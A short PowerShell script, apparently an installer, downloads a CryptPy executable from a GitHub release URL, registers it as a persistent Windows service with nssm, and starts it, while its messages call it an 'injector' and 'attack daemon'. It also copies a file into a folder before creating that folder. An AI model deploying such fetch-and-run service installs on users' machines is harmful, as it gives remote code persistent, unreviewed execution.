$version = $args[0] # Fetch version argument

Copy-Item ".\nssm.exe" -Destination "C:\.cryptpy\nssm.exe"

C:

Write-Output "found injector version $version"

mkdir 'C:\.cryptpy'

Set-Location C:\.cryptpy

$downloadUrl = "https://github.com/mitsukomegumi/CryptPy.js/releases/download/$version/cryptpy-win.exe" # Fetch latest build URL

$downloadCommand = 'curl -S -L '+$downloadUrl+' --output C:\.cryptpy\cryptpy-win.exe' # Set into command

Write-Output "attempting attack with method $downloadCommand"

$downloadPath = 'C:\.cryptpy' # Get current path for future reference

"$downloadCommand" | cmd # Download latest build

Write-Output "attempting to install daemon at dir $downloadPath"

Set-Location C:\.cryptpy

".\nssm.exe install CryptPy $downloadPath\cryptpy-win.exe" | cmd # Register service

Start-Service CryptPy # Start Service

Write-Output "installed attack daemon"